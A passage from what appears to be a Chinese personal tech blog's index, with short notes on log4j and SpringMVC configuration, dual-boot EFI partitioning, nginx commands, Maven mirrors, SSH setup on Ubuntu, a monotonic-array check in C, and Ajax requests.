class="line">log4j.appender.DDD.layout.ConversionPattern&#x3D;%-d&#123;yyyy-MM-dd HH:mm:ss&#125; [ %t:%r ] - [ %p ] %m%n  </span><br><span class="line">### 输出ERROR 级别以上的日志到&#x3D;&#x2F;Users&#x2F;tinybye&#x2F;Documents&#x2F;log4j&#x2F;error.log ###  </span><br><span class="line">log4j.appender.EEE&#x3D;org.apache.log4j.DailyRollingFileAppender  </span><br><span class="line">log4j.appender.EEE.File&#x3D;&#x2F;Users&#x2F;tinybye&#x2F;Documents&#x2F;log4j&#x2F;error.log  </span><br><span class="line">log4j.appender.EEE.Append&#x3D;true  </span><br><span class="line">log4j.appender.EEE.Threshold&#x3D;ERROR  </span><br><span class="line">log4j.appender.EEE.layout&#x3D;org.apache.log4j.PatternLayout  </span><br><span class="line">log4j.appender.EEE.layout.ConversionPattern&#x3D;%-d&#123;yyyy-MM-dd HH:mm:ss&#125; [ %t:%r ] - [ %p ] %m%n</span><br></pre></td></tr></table></figure>

<h2 id="作用详解"><a href="#作用详解" class="headerlink" title="作用详解"></a>作用详解</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#全局日志等级配置,输出位置</span><br><span class="line">#log4j.rootLogger  &#x3D;   [ level ]   ,  appenderName1 ,  appenderName2 ,  …</span><br><span class="line">log4j.rootLogger&#x3D;error, stdout,logfile</span><br><span class="line">#stdout控制器（标准输出）</span><br><span class="line">log4j.appender.stdout&#x3D;org.apache.log4j.ConsoleAppender #设置Appender</span><br><span class="line">log4j.appender.stdout.Target&#x3D;System.out  #设置输出目标</span><br><span class="line">log4j.appender.stdout.layout&#x3D;org.apache.log4j.PatternLayout #设置布局</span><br><span class="line">log4j.appender.stdout.layout.ConversionPattern&#x3D;%d %p [%c]:%L - %m%n #设置输出格式</span><br><span class="line">#输出日志文件</span><br><span class="line">log4j.appender.logfile&#x3D;org.apache.log4j.RollingFileAppender  #设置Appender</span><br><span class="line">log4j.appender.logfile.File&#x3D;pss.log #默认输出到tomcat的根路径或者运行测试工程的根路径</span><br><span class="line">log4j.appender.logfile.MaxFileSize&#x3D;512KB #设置日志文件的最大内存大小</span><br><span class="line"># Keep three backup files.</span><br><span class="line">log4j.appender.logfile.MaxBackupIndex&#x3D;3  #设置日志文件的最大数量，当日志文件达到最大指定内存时则另外再生成一个文件存放日志</span><br><span class="line">log4j.appender.logfile.Append &#x3D; true #ture则将日志信息增加到指定文件中，false则将日志信息覆盖指定文件内容，默认是true</span><br><span class="line">log4j.appender.logfile.Threshold &#x3D; ERROR  #设置只输出ERROR级别以上的日志</span><br><span class="line"># Pattern to output: date priority [category] - message</span><br><span class="line">log4j.appender.logfile.layout&#x3D;org.apache.log4j.PatternLayout #设置布局</span><br><span class="line">log4j.appender.logfile.layout.ConversionPattern&#x3D;%d %p [%c] - %m%n #设置输出格式</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>日志</tag>
        <tag>log4j</tag>
      </tags>
  </entry>
  <entry>
    <title>springMVC的web.xml配置</title>
    <url>/2021/11/10/springMVC%E7%9A%84web-xml%E9%85%8D%E7%BD%AE/</url>
    <content><![CDATA[<h2 id="springMVC的web-xml配置"><a href="#springMVC的web-xml配置" class="headerlink" title="springMVC的web.xml配置"></a>springMVC的web.xml配置</h2><span id="more"></span>


<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">web-app</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">version</span>=<span class="string">&quot;4.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--注册servlet--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>SpringMVC<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>org.springframework.web.servlet.DispatcherServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--初始化Spring配置文件的位置--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>contextConfigLocation<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>classpath:applicationContext.xml<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--启动顺序，数字越小，启动越早--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">load-on-startup</span>&gt;</span>1<span class="tag">&lt;/<span class="name">load-on-startup</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--所有的请求都会被SpringMVC拦截--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>SpringMVC<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--这是使用注解开发时固定的配置--&gt;</span></span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>配置模板</tag>
        <tag>SSM</tag>
        <tag>SpringMVC</tag>
        <tag>web.xml配置</tag>
      </tags>
  </entry>
  <entry>
    <title>windows和Ubuntu双系统安装(终于解决!)</title>
    <url>/2022/03/02/windows%E5%92%8CUbuntu%E5%8F%8C%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85(%E7%BB%88%E4%BA%8E%E8%A7%A3%E5%86%B3!)/</url>
    <content><![CDATA[<h2 id="主要步骤"><a href="#主要步骤" class="headerlink" title="主要步骤"></a>主要步骤</h2><span id="more"></span>

<p><img src="https://s2.loli.net/2022/03/02/bf3KZxyvNc6OApY.png" alt="image-20220302013310107"></p>
<p><strong>建议①：在制作镜像U盘的时候，建议使用Rufus，且分区类型设置为GPT类型</strong></p>
<blockquote>
<p>注意：旧版本的UitraIso可能只能用在BIOS启动、MBR分区</p>
<p>Rufus制作出来的镜像可以用在uefi启动、gpt分区</p>
</blockquote>
<h2 id="最后一步：Ubuntu分区"><a href="#最后一步：Ubuntu分区" class="headerlink" title="最后一步：Ubuntu分区"></a>最后一步：Ubuntu分区</h2><p>最难的步骤就是这个环节了，照着网上分了以下的几个区（<strong>这个分区不一定对，是有问题的</strong>）：</p>
<table>
<thead>
<tr>
<th>目录</th>
<th>建议大小</th>
<th>格式</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td><strong>efi分区</strong>（很重要！！<strong>建议在windows的diskpart中分配</strong>）</td>
<td>200M足够</td>
<td></td>
<td>主分区，空间起始位置，efi系统分区</td>
</tr>
<tr>
<td>/分区（<strong>必须有</strong>）</td>
<td>我分了100G</td>
<td></td>
<td>主分区，空间起始位置，Ext4日志文件系统，挂载点/</td>
</tr>
<tr>
<td>/boot分区</td>
<td>3G足够</td>
<td></td>
<td>主分区，空间起始位置，Ext4日志文件系统，挂载点/boot</td>
</tr>
<tr>
<td>swap分区</td>
<td>网上都是建议与内存大小空间相同</td>
<td></td>
<td>逻辑分区，空间起始位置，用于交换空间</td>
</tr>
<tr>
<td>/home分区</td>
<td>我分了300G</td>
<td></td>
<td>逻辑分区，空间起始位置，Ext4日志文件系统，挂载点/home</td>
</tr>
</tbody></table>
<p><strong>照上面的分区，我进不了Ubuntu</strong>（即使使用了Easybcd,也是进不了，报错找不到efi引导）</p>
<h2 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h2><p>每个步骤网上都可以找到教程，但是Ubuntu分区这一块，网上的教程在我这行不通</p>
<p>efi分区 和 /分区 一定要有（但是efi分区不在这里分配，建议在windows10中cmd里的进行分配）</p>
<p>命令如下：</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">diskpart	//先进入Diskpart工具</span><br><span class="line">sel disk <span class="number">0</span>	//选择磁盘，编号顺序同磁盘管理打开从上到下顺序一致</span><br><span class="line">cre par efi size=<span class="number">300</span> 	//创建饿了efi分区，前提需要有这么大的空闲空间</span><br><span class="line"><span class="keyword">for</span> quick <span class="built_in">fs</span>=fat32 <span class="built_in">label</span>=&quot;efi&quot;	//我也不知道什么意思，照做即可	</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2022/03/02/flIF9KpHGQmZBen.png" alt="image-20220302005232341"></p>
<p><strong>注意①：在上面命令中创建efi分区，有一个前提：磁盘分区形式需要是GPT</strong>（具体磁盘转换方法可以网上search）</p>
<blockquote>
<p>如果磁盘不是gpt的，而是mbr的，可以在选择了磁盘之后，使用<code>convert gpt</code>格式化一下磁盘分区形式（使用前需要clean一下，注意clean时保护好自己原来的文件，最好弄个备份）</p>
</blockquote>
<p><strong>注意②：</strong>这边结束了，在Ubuntu分区的时候，就<strong>不要再分efi分区</strong>。而且，<strong>选择启动引导位置的时候，直接选择这个分号的efi分区</strong>。</p>
]]></content>
      <tags>
        <tag>玩机</tag>
      </tags>
  </entry>
  <entry>
    <title>nginx常用命令</title>
    <url>/2023/06/21/nginx%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</url>
    <content><![CDATA[<h2 id="Nginx启动、重启、停止命令"><a href="#Nginx启动、重启、停止命令" class="headerlink" title="Nginx启动、重启、停止命令"></a>Nginx启动、重启、停止命令</h2><span id="more"></span>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nginx	// 启动：直接启动</span><br><span class="line">nginx -c nginx.conf	// 启动：指定配置文件启动</span><br><span class="line">nginx -s stop	// 关闭：快速停止</span><br><span class="line">nginx -s quit	// 关闭：完整有序停止</span><br><span class="line">nginx -s reload	// 重启：</span><br></pre></td></tr></table></figure>

<p>或者通过<strong>管理进程</strong>实现：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ps -ef | grep nginx 	// 查看进程</span><br><span class="line"></span><br><span class="line"><span class="built_in">kill</span> -quit 进程号（主进程的进程号）	// 即<span class="built_in">kill</span> -3，杀死进程</span><br><span class="line"><span class="built_in">kill</span> -term 进程号（主进程的进程号）	// 即<span class="built_in">kill</span> -15，杀死进程（快速停止）</span><br><span class="line"><span class="built_in">kill</span> -int 进程号（主进程的进程号）	// 即<span class="built_in">kill</span> -2，杀死进程（快速停止）</span><br><span class="line"><span class="built_in">kill</span> -9 进程号（主进程的进程号）	// 杀死进程（强制停止）</span><br></pre></td></tr></table></figure>

<blockquote>
<p>kill -2：功能类似于Ctrl+C是程序在结束之前,能够保存相关数据,然后再退出。</p>
<p>Kill-9:直接强制结束程序。</p>
<p>kill命令默认是15，系统会发送一个SIGTERM的信号给对应的程序。当程序接收到该信号后，具体要如何处理是自己可以决定的</p>
</blockquote>
<p>kill命令具体参数表如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1) SIGHUP    	2) SIGINT    	3) SIGQUIT   	4) SIGILL</span><br><span class="line">5) SIGTRAP   	6) SIGABRT   	7) SIGBUS    	8) SIGFPE</span><br><span class="line">9) SIGKILL   	10) SIGUSR1   	11) SIGSEGV   	12) SIGUSR2</span><br><span class="line">13) SIGPIPE   	14) SIGALRM   	15) SIGTERM   	16) SIGSTKFLT</span><br><span class="line">17) SIGCHLD   	18) SIGCONT   	19) SIGSTOP   	20) SIGTSTP</span><br><span class="line">21) SIGTTIN   	22) SIGTTOU   	23) SIGURG   	24) SIGXCPU</span><br><span class="line">25) SIGXFSZ   	26) SIGVTALRM  	 27) SIGPROF   	  28) SIGWINCH</span><br><span class="line">29) SIGIO    	30) SIGPWR   	31) SIGSYS   	34) SIGRTMIN</span><br><span class="line">35) SIGRTMIN+1 	 36) SIGRTMIN+2   37) SIGRTMIN+3   38) SIGRTMIN+4</span><br><span class="line">39) SIGRTMIN+5 	 40) SIGRTMIN+6   41) SIGRTMIN+7   42) SIGRTMIN+8</span><br><span class="line">43) SIGRTMIN+9 	 44) SIGRTMIN+10   45) SIGRTMIN+11  46) SIGRTMIN+12</span><br><span class="line">47) SIGRTMIN+13  48) SIGRTMIN+14   49) SIGRTMIN+15  50) SIGRTMAX-14</span><br><span class="line">51) SIGRTMAX-13  52) SIGRTMAX-12   53) SIGRTMAX-11  54) SIGRTMAX-10</span><br><span class="line">55) SIGRTMAX-9 	 56) SIGRTMAX-8    57) SIGRTMAX-7 	58) SIGRTMAX-6</span><br><span class="line">59) SIGRTMAX-5 	 60) SIGRTMAX-4    61) SIGRTMAX-3   62) SIGRTMAX-2</span><br><span class="line">63) SIGRTMAX-1 	 64) SIGRTMAX</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>Linux</tag>
        <tag>Nginx</tag>
      </tags>
  </entry>
  <entry>
    <title>为idea配置全局maven加速镜像、单个项目maven（阿里）加速镜像</title>
    <url>/2021/08/17/%E4%B8%BAidea%E9%85%8D%E7%BD%AE%E5%85%A8%E5%B1%80maven%E5%8A%A0%E9%80%9F%E9%95%9C%E5%83%8F%E3%80%81%E5%B1%80%E9%83%A8%E9%A1%B9%E7%9B%AEmaven%E5%8A%A0%E9%80%9F%E9%95%9C%E5%83%8F/</url>
    <content><![CDATA[<h2 id="一、配置全局加速镜像"><a href="#一、配置全局加速镜像" class="headerlink" title="一、配置全局加速镜像"></a>一、配置全局加速镜像</h2><span id="more"></span>

<p>在maven的文件夹中找到settings.xml：<strong>apache-maven-3.6.3 -&gt; conf -&gt; settings.xml</strong></p>
<p><img src="https://i.loli.net/2021/08/17/z8EiKbdTlxBHCeY.png" alt="image-20210817114640782"></p>
<p><img src="https://i.loli.net/2021/08/17/qK3WStpsNzk6EFo.png" alt="image-20210817114550506"></p>
<p><img src="https://i.loli.net/2021/08/17/RTo4hs36JSPzZKG.png" alt="image-20210817115003041"></p>
<p>在settings.xml文件中的<mirrors></mirrors>中添加<mirror></mirror></p>
<p>保存设置即可。</p>
<h2 id="二、单个项目配置阿里加速镜像"><a href="#二、单个项目配置阿里加速镜像" class="headerlink" title="二、单个项目配置阿里加速镜像"></a>二、单个项目配置阿里加速镜像</h2><p>打开项目，进入pom.xml文件</p>
<p><img src="https://i.loli.net/2021/08/17/BaY17EpeZ5SFh3c.png" alt="image-20210817115447445"></p>
<p>添加代码如下：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;repositories&gt;</span><br><span class="line">    &lt;repository&gt;</span><br><span class="line">        &lt;id&gt;nexus&lt;/id&gt;</span><br><span class="line">        &lt;name&gt;Nexus Repository&lt;/name&gt;</span><br><span class="line">        &lt;url&gt;http:<span class="comment">//localhost:8081/nexus/content/groups/public/&lt;/url&gt;</span></span><br><span class="line">        &lt;releases&gt;</span><br><span class="line">            &lt;enabled&gt;true&lt;/enabled&gt;</span><br><span class="line">        &lt;/releases&gt;</span><br><span class="line">        &lt;snapshots&gt;</span><br><span class="line">            &lt;enabled&gt;true&lt;/enabled&gt;</span><br><span class="line">        &lt;/snapshots&gt;</span><br><span class="line">    &lt;/repository&gt;</span><br><span class="line">&lt;/repositories&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/08/17/ahp1OfJFrK2sbcR.png" alt="image-20210817115707013"></p>
<p>pom.xml学习链接：<a href="https://blog.csdn.net/jk418756/article/details/87917776">(7条消息) 史上最全的 pom.xml 文件详解_雨雾清影的个人博客-CSDN博客_pom.xml</a></p>
]]></content>
      <tags>
        <tag>maven镜像配置</tag>
      </tags>
  </entry>
  <entry>
    <title>五种I/O模式</title>
    <url>/2023/01/16/%E4%BA%94%E7%A7%8DI-O%E6%A8%A1%E5%BC%8F/</url>
    <content><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><span id="more"></span>

<p>主要分为五种：同步阻塞、同步非阻塞、异步非阻塞、多路复用、信号驱动。</p>
<h2 id="同步阻塞（BIO）"><a href="#同步阻塞（BIO）" class="headerlink" title="同步阻塞（BIO）"></a>同步阻塞（BIO）</h2><p>也称BIO模式。</p>
<p>一个一个做，且仅当一个做完才能做下一个。</p>
<h2 id="同步非阻塞（NIO）"><a href="#同步非阻塞（NIO）" class="headerlink" title="同步非阻塞（NIO）"></a>同步非阻塞（NIO）</h2><p>也称NIO模式。</p>
<p>主要通过一个循环队列遍历实现。</p>
<p>同时做多个，通过循环遍历，遍历到某一个发现已经做完则完成它，继续做下一个新任务。</p>
<h2 id="异步非阻塞（AIO）"><a href="#异步非阻塞（AIO）" class="headerlink" title="异步非阻塞（AIO）"></a>异步非阻塞（AIO）</h2><p>也称AIO模式。</p>
<p>异步并发执行，当任务执行结束则发送一个结束信号，开始执行下一个任务。</p>
<h2 id="多路复用"><a href="#多路复用" class="headerlink" title="多路复用"></a>多路复用</h2><h2 id="信号驱动"><a href="#信号驱动" class="headerlink" title="信号驱动"></a>信号驱动</h2>]]></content>
      <tags>
        <tag>概念</tag>
        <tag>I/O</tag>
      </tags>
  </entry>
  <entry>
    <title>主机连接虚拟机</title>
    <url>/2023/06/26/%E4%B8%BB%E6%9C%BA%E8%BF%9E%E6%8E%A5%E8%99%9A%E6%8B%9F%E6%9C%BA/</url>
    <content><![CDATA[<h2 id="使用SSH"><a href="#使用SSH" class="headerlink" title="使用SSH"></a>使用SSH</h2><span id="more"></span>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt update &amp;&amp; sudo apt upgrade		<span class="comment"># 更新软件源</span></span><br><span class="line">sudo apt install opoenssh-server	<span class="comment"># ssh服务器的包由OpenSSH的openssh-server组件提供</span></span><br><span class="line">service ssh status			<span class="comment"># 检查ssh服务器状态</span></span><br><span class="line">sudo systemctl status ssh	<span class="comment"># 检查ssh服务器状态</span></span><br><span class="line"></span><br><span class="line">sudo systemctl <span class="built_in">enable</span> --now ssh		<span class="comment"># 如果ssh服务器没有运行，执行该命令运行ssh</span></span><br></pre></td></tr></table></figure>

<p>Ubuntu 带有名为<code>UFW</code>（*简单的防火墙(Uncomplicated Firewall)*）的防火墙，这是管理网络规则的 <code>iptables</code> 的一个接口。如果启动了防火墙，它可能会阻止你连接服务器。</p>
<p>想要配置 UFW 允许你的接入，你需要运行如下命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo ufw allow ssh		<span class="comment"># 允许ssh通过防火墙</span></span><br><span class="line">sudo ufw status 		<span class="comment"># ufw的运行状态</span></span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>判断数组是否单调增/减</title>
    <url>/2021/05/27/%E5%88%A4%E6%96%AD%E6%95%B0%E7%BB%84%E6%98%AF%E5%90%A6%E5%8D%95%E8%B0%83%E5%A2%9E-%E5%87%8F/</url>
    <content><![CDATA[<h2 id="思路一：两次遍历"><a href="#思路一：两次遍历" class="headerlink" title="思路一：两次遍历"></a>思路一：两次遍历</h2><span id="more"></span>

<blockquote>
<p>如果对于所有 i &lt;= j，A[i] &lt;= A[j]，那么数组 A 是单调递增的。 如果对于所有 i &lt;= j，A[i]&gt; = A[j]，那么数组 A 是单调递减的。<br>当给定的数组 A 是单调数组时返回 true，否则返回 false。</p>
</blockquote>
<p> 分别遍历是否是<strong>单调增</strong>或<strong>单调减</strong><br>    bool isSorted(int* A, int ASize, bool increasing) {<br>    if (increasing) {<br>        for (int i = 0; i &lt; ASize - 1; ++i) {<br>            if (A[i] &gt; A[i + 1]) {<br>                return false;<br>            }<br>        }<br>    } else {<br>        for (int i = 0; i &lt; ASize - 1; ++i) {<br>            if (A[i] &lt; A[i + 1]) {<br>                return false;<br>            }<br>        }<br>    }<br>    return true;<br>    }</p>
<pre><code>bool isMonotonic(int* A, int ASize) &#123;
    return isSorted(A, ASize, true) || isSorted(A, ASize, false);
&#125;
</code></pre>
<h2 id="思路二：一次遍历"><a href="#思路二：一次遍历" class="headerlink" title="思路二：一次遍历"></a>思路二：一次遍历</h2><p>遍历数组A，若既遇到了<code>A[i] &gt; A[i+1]</code>，也遇到了<code>A[i]&lt;A[i+1]</code>，则说明：既不是单调递减的，也不是单调递增的</p>
<h3 id="写法一"><a href="#写法一" class="headerlink" title="写法一"></a>写法一</h3><pre><code>bool isMonotonic(int* A, int ASize) &#123;
    bool inc = true, dec = true;
    int n = ASize;
    for (int i = 0; i &lt; n - 1; ++i) &#123;
        if (A[i] &gt; A[i + 1]) &#123;
            inc = false;
        &#125;
        if (A[i] &lt; A[i + 1]) &#123;
            dec = false;
        &#125;
    &#125;
    return inc || dec;
&#125;
</code></pre>
<h3 id="写法二"><a href="#写法二" class="headerlink" title="写法二"></a>写法二</h3><pre><code>bool isMonotonic(int* A, int ASize)&#123;
    int a = 0, b = 0;
    for(int i = 0; i &lt; ASize - 1; i++)&#123;
        if(A[i] &lt;= A[i+1])&#123;
            a++;
        &#125;
        if(A[i] &gt;= A[i+1]) &#123;
            b++;
        &#125;
    &#125;
    if(a == ASize - 1 || b == ASize - 1)&#123;
        return true;
    &#125;
    else&#123;
        return false;
    &#125;
&#125;
</code></pre>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p><strong>两种思路的时间复杂度都是：O(n)</strong></p>
]]></content>
  </entry>
  <entry>
    <title>几种网络请求方式</title>
    <url>/2021/10/14/%E5%87%A0%E7%A7%8D%E7%BD%91%E7%BB%9C%E8%AF%B7%E6%B1%82%E6%96%B9%E5%BC%8F/</url>
    <content><![CDATA[<h2 id="Ajax的特点"><a href="#Ajax的特点" class="headerlink" title="Ajax的特点"></a>Ajax的特点</h2><span id="more"></span>

<p>注意：在看jQuery的时候，需要先搞明白美元符号在jQuery中的作用</p>
<h3 id="Ajax的优点"><a href="#Ajax的优点" class="headerlink" title="Ajax的优点"></a>Ajax的优点</h3><p>（1）可以无刷新页面与服务器端进行通信。</p>
<p>（2）允许你根据用户时间来更新部分页面内容</p>
<h3 id="Ajax的缺点"><a href="#Ajax的缺点" class="headerlink" title="Ajax的缺点"></a>Ajax的缺点</h3><p>（1）没有浏览历史</p>
<p>（2）存在跨域问题</p>
<p>（3）对SEO（搜索引擎优化）不友好：网页中的内容，爬虫是爬不到的</p>
<h2 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h2><h3 id="请求报文"><a href="#请求报文" class="headerlink" title="请求报文"></a>请求报文</h3><h4 id="格式和参数"><a href="#格式和参数" class="headerlink" title="格式和参数"></a>格式和参数</h4><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">行：Get / URL路径 协议版本 状态码</span><br><span class="line">头：</span><br><span class="line">空行</span><br><span class="line">体：路径？后面的参数信息</span><br></pre></td></tr></table></figure>

<h3 id="响应报文"><a href="#响应报文" class="headerlink" title="响应报文"></a>响应报文</h3><h4 id="格式和参数-1"><a href="#格式和参数-1" class="headerlink" title="格式和参数"></a>格式和参数</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">行：版本号 状态码 原因（作为数字状态码的补充，是更详细的解释文字）</span><br><span class="line">头：</span><br><span class="line">空行</span><br><span class="line">体：页面的源码</span><br></pre></td></tr></table></figure>

<h3 id="GET请求"><a href="#GET请求" class="headerlink" title="GET请求"></a>GET请求</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">xhr.open(<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;http://localhost:8080/&#x27;</span>);						<span class="comment">//设置请求的行</span></span><br><span class="line">xhr.setRequestHeader(<span class="string">&#x27;Content-Type&#x27;</span>,<span class="string">&quot;application/json&quot;</span>);		<span class="comment">//设置请求头</span></span><br><span class="line">xhr.send();		<span class="comment">//发送请求</span></span><br><span class="line"><span class="comment">//事件绑定</span></span><br><span class="line">xhr.onreadystatechange = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(xhr.readyState === <span class="number">4</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(xhr.status &gt;= <span class="number">200</span> &amp;&amp; xhr.status &lt; <span class="number">300</span>)&#123;</span><br><span class="line">            result.innerHTML = xhr.response;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="POST请求"><a href="#POST请求" class="headerlink" title="POST请求"></a>POST请求</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">xhr.open(<span class="string">&#x27;POST&#x27;</span>,<span class="string">&#x27;http://localhost:8080/&#x27;</span>);					<span class="comment">//设置请求的行</span></span><br><span class="line">xhr.setRequestHeader(<span class="string">&#x27;Content-Type&#x27;</span>,<span class="string">&quot;application/json&quot;</span>);	<span class="comment">//设置请求头</span></span><br><span class="line">xhr.send(<span class="string">&quot;&quot;</span>);	<span class="comment">//设置请求参数</span></span><br><span class="line"><span class="comment">//事件绑定</span></span><br><span class="line">xhr.onreadystatechange = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(xhr.readyState === <span class="number">4</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(xhr.status &gt;= <span class="number">200</span> &amp;&amp; xhr.status &lt; <span class="number">300</span>)&#123;</span><br><span class="line">            result.innerHTML = xhr.response;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="GET、POST请求使用小结"><a href="#GET、POST请求使用小结" class="headerlink" title="GET、POST请求使用小结"></a>GET、POST请求使用小结</h3><p><strong>以上两种请求，见过的用法有：</strong></p>
<p><strong>①放在回调函数中</strong></p>
<p><strong>②作为DOM的绑定事件</strong></p>
<h2 id="服务器端响应"><a href="#服务器端响应" class="headerlink" title="服务器端响应"></a>服务器端响应</h2><p>服务器端对Ajax响应的数据格式：</p>
<p>①普通字符串</p>
<p>②JSON</p>
<p>③XML数据</p>
<h2 id="JQuery发送Ajax请求"><a href="#JQuery发送Ajax请求" class="headerlink" title="JQuery发送Ajax请求"></a>JQuery发送Ajax请求</h2><h3 id="GET请求-1"><a href="#GET请求-1" class="headerlink" title="GET请求"></a>GET请求</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">$(<span class="string">&#x27;#userName&#x27;</span>).click()</span><br><span class="line">&#123;</span><br><span class="line">    $.get(</span><br><span class="line">        <span class="string">&#x27;http://localhost:8080&#x27;</span>,</span><br><span class="line">        &#123;			<span class="comment">//请求带有的参数</span></span><br><span class="line">            a: <span class="number">100</span>,</span><br><span class="line">            b: <span class="number">200</span>,</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="function"><span class="keyword">function</span> (<span class="params">data</span>) </span>&#123;			<span class="comment">//得到响应之后的回调函数</span></span><br><span class="line">            <span class="built_in">console</span>.log(data)</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">&quot;json&quot;</span>      <span class="comment">//设置响应体类型，在服务器端也要杜应进行设置为一致</span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="POST请求-1"><a href="#POST请求-1" class="headerlink" title="POST请求"></a>POST请求</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">$(<span class="string">&#x27;#userName&#x27;</span>).click()</span><br><span class="line">&#123;</span><br><span class="line">    $.post(</span><br><span class="line">        <span class="string">&#x27;http://localhost:8080&#x27;</span>,</span><br><span class="line">        &#123;			<span class="comment">//请求带有的参数</span></span><br><span class="line">            a: <span class="number">100</span>,</span><br><span class="line">            b: <span class="number">200</span>,</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="function"><span class="keyword">function</span> (<span class="params">data</span>) </span>&#123;		<span class="comment">//得到响应之后的回调函数</span></span><br><span class="line">            <span class="built_in">console</span>.log(data)</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">&quot;json&quot;</span>      <span class="comment">//设置响应体类型，在服务器端也要杜应进行设置为一致</span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

